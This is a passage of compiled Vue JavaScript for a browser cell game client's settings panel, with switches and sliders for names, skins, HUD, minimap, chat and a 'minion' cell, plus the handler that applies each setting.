                t._v("Scroll zoom rate"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${((t.cameraZoomSpeed / 10) * 100).toFixed(0)}%`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "1", max: "20", step: "1" },
                  domProps: { value: t.cameraZoomSpeed },
                  on: {
                    input(s) {
                      t.change("cameraZoomSpeed", s);
                    },
                  },
                }),
                t._v("Replay duration"),
                s("span", { staticClass: "right" }, [
                  t._v(t._s(`${t.replayDuration} seconds`)),
                ]),
                s("input", {
                  staticClass: "form-range",
                  attrs: { type: "range", min: "3", max: "15", step: "1" },
                  domProps: { value: t.replayDuration },
                  on: {
                    input(s) {
                      t.change("replayDuration", s);
                    },
                  },
                }),
              ],
              1
            ),
          ]),
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [t._v("Cells")]),
            s(
              "div",
              { staticClass: "options" },
              [
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "2", step: "1" },
                      domProps: { value: t.showNames },
                      on: {
                        input(s) {
                          t.change("showNames", s);
                        },
                      },
                    }),
                    t._v(`Show ${t._s(t.showNamesMeaning)} names`),
                  ]
                ),
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "2", step: "1" },
                      domProps: { value: t.showSkins },
                      on: {
                        input(s) {
                          t.change("showSkins", s);
                        },
                      },
                    }),
                    t._v(`Show ${t._s(t.showSkinsMeaning)} skins`),
                  ]
                ),
                s(
                  "div",
                  { staticStyle: { display: "flex", "align-self": "center" } },
                  [
                    s("input", {
                      staticClass: "form-range",
                      staticStyle: { width: "50px", "margin-right": "7px" },
                      attrs: { type: "range", min: "0", max: "2", step: "1" },
                      domProps: { value: t.showMass },
                      on: {
                        input(s) {
                          t.change("showMass", s);
                        },
                      },
                    }),
                    t._v(`Show ${t._s(t.showMassMeaning)} mass`),
                  ]
                ),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showOwnName",
                      checked: t.showOwnName,
                    },
                    on: {
                      change() {
                        t.change("showOwnName", !t.showOwnName);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showOwnName" } }, [
                    t._v("Show my own name"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showOwnSkin",
                      checked: t.showOwnSkin,
                    },
                    on: {
                      change() {
                        t.change("showOwnSkin", !t.showOwnSkin);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showOwnSkin" } }, [
                    t._v("Show my own skin"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showOwnMass",
                      checked: t.showOwnMass,
                    },
                    on: {
                      change() {
                        t.change("showOwnMass", !t.showOwnMass);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showOwnMass" } }, [
                    t._v("Show my own mass"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showCrown",
                      checked: t.showCrown,
                    },
                    on: {
                      change() {
                        t.change("showCrown", !t.showCrown);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showCrown" } }, [
                    t._v("Show crown"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showFood",
                      checked: t.foodVisible,
                    },
                    on: {
                      change() {
                        t.change("foodVisible", !t.foodVisible);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showFood" } }, [
                    t._v("Show food"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showEatAnim",
                      checked: t.eatAnimation,
                    },
                    on: {
                      change() {
                        t.change("eatAnimation", !t.eatAnimation);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showEatAnim" } }, [
                    t._v("Show eat animation"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "animateEjectedCells",
                      checked: t.animateEjectedCells,
                    },
                    on: {
                      change() {
                        t.change("animateEjectedCells", !t.animateEjectedCells);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "animateEjectedCells" } }, [
                    t._v("Show ejected cell animation"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showVirusEjecText",
                      checked: t.showVirusEjecText,
                    },
                    on: {
                      change() {
                        t.change("showVirusEjecText", !t.showVirusEjecText);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showVirusEjecText" } }, [
                    t._v("Show virus counter text"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showColoredNames",
                      checked: t.showColoredNames,
                    },
                    on: {
                      change() {
                        t.change("showColoredNames", !t.showColoredNames);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showColoredNames" } }, [
                    t._v("Show custom colored names"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showHats",
                      checked: t.showHats,
                    },
                    on: {
                      change() {
                        t.change("showHats", !t.showHats);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showHats" } }, [
                    t._v("Show custom hats"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showOwnColoredName",
                      checked: t.showOwnColoredName,
                    },
                    on: {
                      change() {
                        t.change("showOwnColoredName", !t.showOwnColoredName);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showOwnColoredName" } }, [
                    t._v("Show my custom colored name"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showOwnHat",
                      checked: t.showOwnHat,
                    },
                    on: {
                      change() {
                        t.change("showOwnHat", !t.showOwnHat);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showOwnHat" } }, [
                    t._v("Show my custom hat"),
                  ]),
                ]),
              ],
              1
            ),
          ]),
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "showHud",
                    checked: t.showHud,
                  },
                  on: {
                    change() {
                      t.change("showHud", !t.showHud);
                    },
                  },
                }),
                s("label", { attrs: { for: "showHud" } }, [t._v("Show HUD")]),
              ]),
            ]),
            s(
              "div",
              { staticClass: "options" },
              [
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showLeaderboard",
                      disabled: !t.showHud,
                      checked: t.showLeaderboard,
                    },
                    on: {
                      change() {
                        t.change("showLeaderboard", !t.showLeaderboard);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showLeaderboard" } }, [
                    t._v("Show leaderboard"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showServerName",
                      disabled: !t.showHud,
                      checked: t.showServerName,
                    },
                    on: {
                      change() {
                        t.change("showServerName", !t.showServerName);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showServerName" } }, [
                    t._v("Leaderboard: Use server name"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showChat",
                      disabled: !t.showHud,
                      checked: t.showChat,
                    },
                    on: {
                      change() {
                        t.change("showChat", !t.showChat);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showChat" } }, [
                    t._v("Show chat"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showMinimap",
                      disabled: !t.showHud,
                      checked: t.minimapEnabled,
                    },
                    on: {
                      change() {
                        t.change("minimapEnabled", !t.minimapEnabled);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showMinimap" } }, [
                    t._v("Show minimap"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showMinimapLocs",
                      disabled: !t.showHud,
                      checked: t.minimapLocations,
                    },
                    on: {
                      change() {
                        t.change("minimapLocations", !t.minimapLocations);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showMinimapLocs" } }, [
                    t._v("Show minimap locations"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showPlayerList",
                      disabled: !t.showHud,
                      checked: t.showPlayerList,
                    },
                    on: {
                      change() {
                        t.change("showPlayerList", !t.showPlayerList);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showPlayerList" } }, [
                    t._v("Show player list"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "listServerBots",
                      disabled: !t.showPlayerList || !t.showHud,
                      checked: t.listServerBots,
                    },
                    on: {
                      change() {
                        t.change("listServerBots", !t.listServerBots);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "listServerBots" } }, [
                    t._v("Player list: Show server bots"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showFPS",
                      disabled: !t.showHud,
                      checked: t.showFPS,
                    },
                    on: {
                      change() {
                        t.change("showFPS", !t.showFPS);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showFPS" } }, [
                    t._v("Stats: FPS"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showPing",
                      disabled: !t.showHud,
                      checked: t.showPing,
                    },
                    on: {
                      change() {
                        t.change("showPing", !t.showPing);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showPing" } }, [
                    t._v("Stats: Ping"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showPlayerMass",
                      disabled: !t.showHud,
                      checked: t.showPlayerMass,
                    },
                    on: {
                      change() {
                        t.change("showPlayerMass", !t.showPlayerMass);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showPlayerMass" } }, [
                    t._v("Stats: Current mass"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showMinionMass",
                      disabled: !t.showHud || !t.enableMinion,
                      checked: t.showMinionMass,
                    },
                    on: {
                      change() {
                        t.change("showMinionMass", !t.showMinionMass);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showMinionMass" } }, [
                    t._v("Stats: Current minion mass"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showPlayerScore",
                      disabled: !t.showHud,
                      checked: t.showPlayerScore,
                    },
                    on: {
                      change() {
                        t.change("showPlayerScore", !t.showPlayerScore);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showPlayerScore" } }, [
                    t._v("Stats: Score"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showCellCount",
                      disabled: !t.showHud,
                      checked: t.showCellCount,
                    },
                    on: {
                      change() {
                        t.change("showCellCount", !t.showCellCount);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showCellCount" } }, [
                    t._v("Stats: Cell count"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showMinionCellCount",
                      disabled: !t.showHud || !t.enableMinion,
                      checked: t.showMinionCellCount,
                    },
                    on: {
                      change() {
                        t.change("showMinionCellCount", !t.showMinionCellCount);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showMinionCellCount" } }, [
                    t._v("Stats: Minion cell count"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showClock",
                      disabled: !t.showHud,
                      checked: t.showClock,
                    },
                    on: {
                      change() {
                        t.change("showClock", !t.showClock);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showClock" } }, [
                    t._v("Minimap stats: System time"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showSessionTime",
                      disabled: !t.showHud,
                      checked: t.showSessionTime,
                    },
                    on: {
                      change() {
                        t.change("showSessionTime", !t.showSessionTime);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showSessionTime" } }, [
                    t._v("Minimap stats: Session time"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showPlayerCount",
                      disabled: !t.showHud,
                      checked: t.showPlayerCount,
                    },
                    on: {
                      change() {
                        t.change("showPlayerCount", !t.showPlayerCount);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showPlayerCount" } }, [
                    t._v("Minimap stats: Players in server"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showSpectators",
                      disabled: !t.showHud,
                      checked: t.showSpectators,
                    },
                    on: {
                      change() {
                        t.change("showSpectators", !t.showSpectators);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showSpectators" } }, [
                    t._v("Minimap stats: Spectators"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showRestartTiming",
                      disabled: !t.showHud,
                      checked: t.showRestartTiming,
                    },
                    on: {
                      change() {
                        t.change("showRestartTiming", !t.showRestartTiming);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showRestartTiming" } }, [
                    t._v("Minimap stats: Server restart time"),
                  ]),
                ]),
                s("div", { staticClass: "form-check form-switch" }, [
                  s("input", {
                    staticClass: "form-check-input",
                    attrs: {
                      type: "checkbox",
                      id: "showCrownHolder",
                      disabled: !t.showHud,
                      checked: t.showCrownHolder,
                    },
                    on: {
                      change() {
                        t.change("showCrownHolder", !t.showCrownHolder);
                      },
                    },
                  }),
                  s("label", { attrs: { for: "showCrownHolder" } }, [
                    t._v("Minimap stats: Crown holder"),
                  ]),
                ]),
              ],
              1
            ),
          ]),
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "enableMinion",
                    checked: t.enableMinion,
                  },
                  on: {
                    change() {
                      t.change("enableMinion", !t.enableMinion);
                    },
                  },
                }),
                s("label", { attrs: { for: "enableMinion" } }, [
                  t._v("Use minion"),
                ]),
              ]),
            ]),
            s(
              "div",
              { staticClass: "options" },
              [
                s(
                  "div",
                  { staticClass: "row", staticStyle: { display: "flex" } },
                  [
                    s("input", {
                      staticStyle: {
                        flex: "2",
                        "min-width": "1px",
                        "margin-right": "10px",
                      },
                      attrs: {
                        type: "text",
                        spellcheck: "false",
                        placeholder: "Nickname",
                        maxlength: "15",
                        disabled: !t.enableMinion,
                      },
                      domProps: { value: t.minionNickname },
                      on: {
                        change() {
                          localStorage.setItem(
                            "minionNickname",
                            t.minionNickname
                          ),
                            t.change("minionNickname", t.minionNickname);
                        },
                        input(s) {
                          s.target.composing ||
                            (t.minionNickname = s.target.value);
                        },
                      },
                    }),
                    s("input", {
                      staticStyle: { flex: "1", "min-width": "1px" },
                      attrs: {
                        type: "text",
                        spellcheck: "false",
                        placeholder: "Tag",
                        maxlength: "15",
                        disabled: !t.enableMinion,
                      },
                      domProps: { value: t.minionTeamTag },
                      on: {
                        change() {
                          localStorage.setItem(
                            "minionTeamTag",
                            t.minionTeamTag
                          ),
                            t.change("minionTeamTag", t.minionTeamTag);
                        },
                        input(s) {
                          s.target.composing ||
                            (t.minionTeamTag = s.target.value);
                        },
                      },
                    }),
                  ]
                ),
                s("input", {
                  attrs: {
                    type: "text",
                    spellcheck: "false",
                    placeholder: "https://skins.vanis.io/s/",
                    maxlength: "31",
                    disabled: !t.enableMinion,
                  },
                  domProps: { value: t.minionSkinUrl },
                  on: {
                    change() {
                      localStorage.setItem("minionSkinUrl", t.minionSkinUrl),
                        t.change("minionSkinUrl", t.minionSkinUrl);
                    },
                    input(s) {
                      s.target.composing || (t.minionSkinUrl = s.target.value);
                    },
                  },
                }),
                s(
                  "div",
                  {
                    staticClass: "form-check form-switch",
                    staticStyle: { "margin-top": "8px" },
                  },
                  [
                    s("input", {
                      staticClass: "form-check-input",
                      attrs: {
                        type: "checkbox",
                        id: "minionUseToken",
                        checked: t.minionUseToken,
                        disabled: !t.enableMinion,
                      },
                      on: {
                        change() {
                          t.change("minionUseToken", !t.minionUseToken);
                        },
                      },
                    }),
                    s("label", { attrs: { for: "minionUseToken" } }, [
                      t._v("Use current session's Discord"),
                    ]),
                  ]
                ),
                s(
                  "div",
                  {
                    staticClass: "form-check form-switch",
                    staticStyle: { "margin-top": "8px" },
                  },
                  [
                    s("input", {
                      staticClass: "form-check-input",
                      attrs: {
                        type: "checkbox",
                        id: "autoSpectate",
                        checked: t.autoSpectate,
                        disabled: !t.enableMinion,
                      },
                      on: {
                        change() {
                          t.change("autoSpectate", !t.autoSpectate);
                        },
                      },
                    }),
                    s("label", { attrs: { for: "autoSpectate" } }, [
                      t._v("Auto spectate on death"),
                    ]),
                  ]
                ),
              ],
              1
            ),
          ]),
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [t._v("Chat")]),
            s("div", { staticClass: "options" }, [
              s("div", { staticClass: "row" }, [
                t._v(
                  "You can right-click people in chat to block them until server restart"
                ),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "showBlockedMessageCount",
                    checked: t.showBlockedMessageCount,
                  },
                  on: {
                    change() {
                      t.change(
                        "showBlockedMessageCount",
                        !t.showBlockedMessageCount
                      );
                    },
                  },
                }),
                s("label", { attrs: { for: "showBlockedMessageCount" } }, [
                  t._v("Show blocked message count"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "filterChatMessages",
                    checked: t.filterChatMessages,
                  },
                  on: {
                    change() {
                      t.change("filterChatMessages", !t.filterChatMessages);
                    },
                  },
                }),
                s("label", { attrs: { for: "filterChatMessages" } }, [
                  t._v("Filter profanity"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "clearChatMessages",
                    checked: t.clearChatMessages,
                  },
                  on: {
                    change() {
                      t.change("clearChatMessages", !t.clearChatMessages);
                    },
                  },
                }),
                s("label", { attrs: { for: "clearChatMessages" } }, [
                  t._v("Clear on disconnect"),
                ]),
              ]),
              s("div", { staticClass: "form-check form-switch" }, [
                s("input", {
                  staticClass: "form-check-input",
                  attrs: {
                    type: "checkbox",
                    id: "chatOnIdle",
                    checked: t.chatOnIdle,
                  },
                  on: {
                    change() {
                      t.change("chatOnIdle", !t.chatOnIdle);
                    },
                  },
                }),
                s("label", { attrs: { for: "chatOnIdle" } }, [
                  t._v("Hide chat on idle"),
                ]),
              ]),
              t._v("Idle time"),
              s("span", { staticClass: "right" }, [
                t._v(t._s(`${t.idleTime} seconds`)),
              ]),
              s("input", {
                staticClass: "form-range",
                attrs: {
                  disabled: !t.chatOnIdle,
                  type: "range",
                  min: "0",
                  max: "30",
                  step: "1",
                },
                domProps: { value: t.idleTime },
                on: {
                  input(s) {
                    t.change("idleTime", s);
                  },
                },
              }),
            ]),
          ]),
          s("div", { staticClass: "reset-option-wrapper" }, [
            s(
              "span",
              {
                staticClass: "reset-option",
                on: {
                  click() {
                    t.confirmReset();
                  },
                },
              },
              [s("i", { staticClass: "fa fa-undo" }), t._v(" Reset")]
            ),
          ]),
        ]);
      };
    k._withStripped = !0;
    var b = i(1),
      S = i(4),
      _ = i(5),
      E = PIXI.utils.isWebGLSupported(),
      B = E && S.useWebGL;
    function M(t) {
      switch (t) {
        case 0:
          return "nobody else's";
        case 1:
          return "tag players'";
        case 2:
          return "everybody's";
        default:
          return "???";
      }
    }
    var Q = {
        data: () => ({
          clientHash: (4096 + parseVersion(clientVersion).build).toString(16),
          isWebGLSupported: E,
          useWebGL: B,
          gameResolution: S.gameResolution,
          smallTextThreshold: S.smallTextThreshold,
          autoZoom: S.autoZoom,
          autoRespawn: S.autoRespawn,
          mouseFreezeSoft: S.mouseFreezeSoft,
          delayDoublesplit: S.delayDoublesplit,
          movementDelay: S.movementDelay,
          drawDelay: S.drawDelay,
          cameraMoveSmoothing: S.cameraMoveSmoothing,
          cameraZoomSmoothing: S.cameraZoomSmoothing,
          cameraZoomSpeed: S.cameraZoomSpeed,
          replayDuration: S.replayDuration,
          showNames: S.showNames,
          showMass: S.showMass,
          showSkins: S.showSkins,
          showOwnName: S.showOwnName,
          showOwnMass: S.showOwnMass,
          showOwnSkin: S.showOwnSkin,
          showCrown: S.showCrown,
          foodVisible: S.foodVisible,
          eatAnimation: S.eatAnimation,
          showVirusEjecText: S.showVirusEjecText,
          showHud: S.showHud,
          showLeaderboard: S.showLeaderboard,
          showServerName: S.showServerName,
          showChat: S.showChat,
          minimapEnabled: S.minimapEnabled,
          minimapLocations: S.minimapLocations,
          showPlayerList: S.showPlayerList,
          listServerBots: S.listServerBots,
          showFPS: S.showFPS,
          showPing: S.showPing,
          showCellCount: S.showCellCount,
          showPlayerScore: S.showPlayerScore,
          showPlayerMass: S.showPlayerMass,
          showMinionCellCount: S.showMinionCellCount,
          showMinionMass: S.showMinionMass,
          showClock: S.showClock,
          showSessionTime: S.showSessionTime,
          showPlayerCount: S.showPlayerCount,
          showSpectators: S.showSpectators,
          showRestartTiming: S.showRestartTiming,
          showCrownHolder: S.showCrownHolder,
          showBlockedMessageCount: S.showBlockedMessageCount,
          filterChatMessages: S.filterChatMessages,
          clearChatMessages: S.clearChatMessages,
          chatBypass: S.chatBypass,
          chatOnIdle: S.chatOnIdle,
          idleTime: S.idleTime,
          showColoredNames: S.showColoredNames,
          showHats: S.showHats,
          showOwnColoredName: S.showOwnColoredName,
          showOwnHat: S.showOwnHat,
          enableMinion: S.enableMinion,
          autoSpectate: S.autoSpectate,
          minionAutoRespawn: S.minionAutoRespawn,
          minionNickname: localStorage.minionNickname || S.minionNickname,
          minionTeamTag: localStorage.minionTeamTag || S.minionTeamTag,
          minionSkinUrl: localStorage.minionSkinUrl || S.minionSkinUrl,
          minionUseToken: S.minionUseToken,
          antiAfk: S.antiAfk,
          rotateSkins: S.rotateSkins,
          autoReconnect: S.autoReconnect,
          animateEjectedCells: S.animateEjectedCells,
          legacyLinesplit: S.legacyLinesplit,
        }),
        computed: {
          showNamesMeaning() {
            return M(this.showNames);
          },
          showSkinsMeaning() {
            return M(this.showSkins);
          },
          showMassMeaning() {
            return M(this.showMass);
          },
          invitiationCode: () => "d34db33f",
        },
        methods: {
          promptRestart() {
            _.confirm("Refresh page to apply changes?", () => {
              setTimeout(() => location.reload(), 500);
            });
          },
          change(t, s) {
            let i;
            if (
              ((i =
                s && s.target
                  ? isNaN(s.target.valueAsNumber)
                    ? s.target.value
                    : s.target.valueAsNumber
                  : s),
              S[t] != i)
            ) {
              switch (((this[t] = i), S.set(t, i), t)) {
                case "minimapLocations":
                  b.events.$emit("minimap-show-locations", i);
                  break;
                case "showHud":
                  window.app.showHud = i;
              }
              if (b.running)
                switch (t) {
                  case "backgroundColor":
                    b.renderer.backgroundColor = PIXI.utils.string2hex(i);
                    break;
                  case "showPlayerList":
                    b.events.$emit("connection-list-visible", i);
                    break;
                  case "showNames":
                  case "showSkins":
                  case "showMass":
                  case "showOwnName":
                  case "showOwnSkin":
                  case "showOwnMass":
                  case "showColoredNames":
                  case "showOwnColoredName":
                  case "showHats":
                  case "showOwnHat":
                    b.playerManager.invalidateVisibility();
                    break;
                  case "showVirusEjecText":
                    i || b.scene.invalidateVirusCounters();
                    break;
                  case "foodVisible":
                    b.scene.food.visible = i;
                    break;
                  case "showLeaderboard":
                    b.events.$emit("leaderboard-visible", i);
                    break;
                  case "minimapEnabled":
                    i
                      ? b.events.$emit("minimap-show")
                      : b.events.$emit("minimap-hide");
                    break;
                  case "showFPS":
                  case "showPing":
                  case "showPlayerMass":
                  case "showMinionMass":
                  case "showMinionCellCount":
                  case "showPlayerScore":
                  case "showCellCount":
                    b.events.$emit("stats-invalidate-shown");
                    break;
                  case "showClock":
                  case "showSessionTime":
                  case "showSpectators":
                  case "showPlayerCount":
                  case "showRestartTiming":
                  case "showCrownHolder":
                    b.events.$emit("minimap-stats-invalidate-shown");
                    break;
                  case "showChat":
                    b.events.$emit("chat-visible", i);
                    break;
                  case "showBlockedMessageCount":
                    b.events.$emit("show-blocked-message-count", i);
                    break;
                  case "chatOnIdle":
                    b.events.$emit("chat-change-idle-timer", !i);
                    break;
                  case "idleTime":
                    b.events.$emit("chat-change-idle-timer", !1);
                }
            }
          },
          confirmReset() {
            _.confirm(
              "Are you sure you want to reset all setting options?",
              () => this.reset()
            );
          },
          reset() {
            let t = ["clientHash", "isWebGLSupported"];
            for (let s in this.$data)
              t.includes(s) || this.change(s, S.getDefault(s));
          },
        },
      },
      U = (i(170), Object(v.a)(Q, k, [], !1, null, "3ddebeb3", null)).exports,
      N = function () {
        var t = this,
          s = t._self._c || t.$createElement;
        return s("div", { staticClass: "container" }, [
          s("div", { staticClass: "section row" }, [
            s("div", { staticClass: "header" }, [
              t._v("\n            Colors and images\n        "),
            ]),
            t._v(" "),
            s("div", { staticClass: "options two-columns" }, [
              s("span", [
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Background")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: { value: t.backgroundColor },
                      on: {
                        input: function (s) {
                          return t.change("backgroundColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Map border")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: { value: t.borderColor },
                      on: {
                        input: function (s) {
                          return t.change("borderColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  {
                    staticClass: "color-input",
                    class: { disabled: !t.useFoodColor },
                  },
                  [
                    s("span", [t._v("Food")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: { disabled: !t.useFoodColor, value: t.foodColor },
                      on: {
                        input: function (s) {
                          return t.change("foodColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Ejected cells")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: {
                        disabled: t.rainbowEjectedMass,
                        value: t.ejectedColor,
                      },
                      on: {
                        input: function (s) {
                          return t.change("ejectedColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Name outline")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: { value: t.cellNameOutlineColor },
                      on: {
                        input: function (s) {
                          return t.change("cellNameOutlineColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
                t._v(" "),
                s(
                  "div",
                  { staticClass: "color-input" },
                  [
                    s("span", [t._v("Owned cells")]),
                    t._v(" "),
                    s("color-option", {
                      staticClass: "right",
                      attrs: {
                        disabled: !t.useOwnCellColor,
                        value: t.ownCellColor,
                      },
                      on: {
                        input: function (s) {
                          return t.change("ownCellColor", s);
                        },
                      },
                    }),
                  ],
                  1
                ),
              ]),
              t._v(" "),
              s("span", [
                s(
